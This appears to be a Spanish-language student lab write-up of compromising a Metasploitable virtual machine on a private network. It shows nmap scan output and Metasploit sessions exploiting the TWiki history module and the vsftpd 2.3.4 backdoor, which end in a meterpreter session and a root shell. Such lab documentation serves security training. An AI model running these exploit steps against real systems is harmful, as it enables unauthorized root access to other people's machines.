Ubuntu:
-Obtener información del sistema vulnerable
Con la herramienta nmap escaneamos la dirección del sistema vulnerable.

   $ nmap -sV -Pn 192.168.1.141
   Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-10 11:46 EDT
   Nmap scan report for 192.168.1.141
   Host is up (0.0084s latency).
   Not shown: 977 closed tcp ports (conn-refused)
   PORT     STATE SERVICE     VERSION
   21/tcp   open  ftp         vsftpd 2.3.4
   22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
   23/tcp   open  telnet      Linux telnetd
   25/tcp   open  smtp        Postfix smtpd
   53/tcp   open  domain      ISC BIND 9.4.2
   80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
   111/tcp  open  rpcbind     2 (RPC #100000)
   139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
   445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
   512/tcp  open  exec        netkit-rsh rexecd
   513/tcp  open  login
   514/tcp  open  tcpwrapped
   1099/tcp open  java-rmi    GNU Classpath grmiregistry
   1524/tcp open  bindshell   Metasploitable root shell
   2049/tcp open  nfs         2-4 (RPC #100003)
   2121/tcp open  ftp         ProFTPD 1.3.1
   3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
   5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
   5900/tcp open  vnc         VNC (protocol 3.3)
   6000/tcp open  X11         (access denied)
   6667/tcp open  irc         UnrealIRCd
   8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
   8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
   Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
   
   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 12.02 seconds


-Explorar e identificar vulnerabilidades del sistema 
Con la heramienta metasploid framework indentificamos 2 vulnerabilidades: proftp y ssh.

msf6 exploit(unix/ftp/proftpd_133c_backdoor) > search exploit/unix/webapp/twiki_historysae
95   exploit/unix/webapp/twiki_history                                  2005-09-14       excellent  Yes    TWiki History TWikiUsers rev Parameter Command Execution

msf6 > search ssh_login

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/ssh_login                          normal  No     SSH Login Check Scanner
   1  auxiliary/scanner/ssh/ssh_login_pubkey                   normal  No     SSH Public Key Login Scanner


Explotar las vulnerabilidades

En mi caso voy a explotar el puerto 80 mediante el modulo exploit/unix/webapp/twiki_history)
   exploit(unix/webapp/twiki_history) > 
   [+] Successfully sent exploit request
   [*] Started bind TCP handler against 192.168.1.141:4444
   [*] Command shell session 2 opened (192.168.1.138:46177 -> 192.168.1.141:4444) at 2023-10-10 12:11:14 -0400

vemos las sesiones activas:

   msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 

   Active sessions
   ===============
   
     Id  Name  Type                 Information           Connection
     --  ----  ----                 -----------           ----------
     3         meterpreter x86/lin  www-data @ metasploi  192.168.1.138:4433 -
               ux                   table.localdomain     > 192.168.1.141:4631
                                                          8 (192.168.1.141)

usamos el modulo post/multi/manage/shell_tometerpreter:

 msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 3
   [*] Starting interaction with 3...

   meterpreter > ifconfig

   Interface  1
   ============
   Name         : lo
   Hardware MAC : 00:00:00:00:00:00
   MTU          : 16436
   Flags        : UP,LOOPBACK
   IPv4 Address : 127.0.0.1
   IPv4 Netmask : 255.0.0.0
   IPv6 Address : ::1
   IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::
   
   
   Interface  2
   ============
   Name         : eth0
   Hardware MAC : 08:00:27:b1:b5:c7
   MTU          : 1500
   Flags        : UP,BROADCAST,MULTICAST
   IPv4 Address : 192.168.1.141
   IPv4 Netmask : 255.255.255.0
   IPv6 Address : fe80::a00:27ff:feb1:b5c7
   IPv6 Netmask : ffff:ffff:ffff:ffff::

Ahora vamos a explotar el puerto 21 de ftp:
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


msf6 > use exploit/unix/ftp/vsftpd_234_backdoor 
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 192.168.1.141
rhosts => 192.168.1.141
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 192.168.1.141:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.1.141:21 - USER: 331 Please specify the password.
[+] 192.168.1.141:21 - Backdoor service has been spawned, handling...
[+] 192.168.1.141:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.1.138:36243 -> 192.168.1.141:6200) at 2023-10-10 13:00:58 -0400

Ahora podemos tener a nuestra disposicion el sistema de ficheros del host vulnerable:
   pwd
   /
   ls -la
   total 89
   drwxr-xr-x  21 root root  4096 May 20  2012 .
   drwxr-xr-x  21 root root  4096 May 20  2012 ..
   drwxr-xr-x   2 root root  4096 May 13  2012 bin
   drwxr-xr-x   4 root root  1024 May 13  2012 boot
   lrwxrwxrwx   1 root root    11 Apr 28  2010 cdrom -> media/cdrom
   drwxr-xr-x  14 root root 13540 Oct 10 11:43 dev
   drwxr-xr-x  94 root root  4096 Oct 10 11:43 etc
   drwxr-xr-x   6 root root  4096 Apr 16  2010 home
   drwxr-xr-x   2 root root  4096 Mar 16  2010 initrd
   lrwxrwxrwx   1 root root    32 Apr 28  2010 initrd.img -> boot/initrd.img-2.6.24-16-server
   drwxr-xr-x  13 root root  4096 May 13  2012 lib
   drwx------   2 root root 16384 Mar 16  2010 lost+found
   drwxr-xr-x   4 root root  4096 Mar 16  2010 media
   drwxr-xr-x   3 root root  4096 Apr 28  2010 mnt
   -rw-------   1 root root  5821 Oct 10 11:43 nohup.out
   drwxr-xr-x   2 root root  4096 Mar 16  2010 opt
   dr-xr-xr-x 112 root root     0 Oct 10 11:43 proc
   drwxr-xr-x  13 root root  4096 Oct 10 11:43 root
   drwxr-xr-x   2 root root  4096 May 13  2012 sbin
   drwxr-xr-x   2 root root  4096 Mar 16  2010 srv
   drwxr-xr-x  12 root root     0 Oct 10 11:43 sys
   drwxrwxrwt   4 root root  4096 Oct 10 12:28 tmp
   drwxr-xr-x  12 root root  4096 Apr 28  2010 usr
   drwxr-xr-x  14 root root  4096 Mar 17  2010 var
   lrwxrwxrwx   1 root root    29 Apr 28  2010 vmlinuz -> boot/vmlinuz-2.6.24-16-server





